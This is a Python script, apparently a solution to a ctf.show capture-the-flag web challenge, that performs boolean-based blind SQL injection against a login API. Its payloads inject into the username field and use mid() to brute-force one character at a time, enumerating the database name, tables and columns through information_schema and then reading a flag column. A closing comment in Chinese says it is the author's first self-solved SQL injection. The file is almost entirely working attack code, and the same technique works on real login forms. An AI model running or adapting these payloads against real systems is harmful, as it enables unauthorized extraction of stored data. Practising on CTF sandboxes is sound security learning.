import requests

url = "http://c851c205-7eb9-4141-b8de-fe8ac455083c.challenge.ctf.show/api/"
result = ""

for i in range(1,50):
    for j in "1234567890abcdefghijklmnopqrstuvwxyz-{}_":
        payload = f"admin' and mid(database(),{i},1)='{j}' #"
        payload = f"admin' and mid((select table_name from information_schema.tables where table_schema = 'ctfshow_web' limit 0,1),{i},1)='{j}' #"
        payload = f"admin' and mid((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web'and table_name='ctfshow_flxg' limit 0,1),{i},1)='{j}' #"
        payload = f"admin' and mid((select f1ag from ctfshow_web.ctfshow_flxg),{i},1)='{j}"
        #print(payload)
        response = requests.request("POST", url=url, data={"username":payload,"password":"0"})
        if 'u5bc6' in response.text:
            result += j
            print(result)
            break
    print("1")


#第一道自己干出来的sql注入！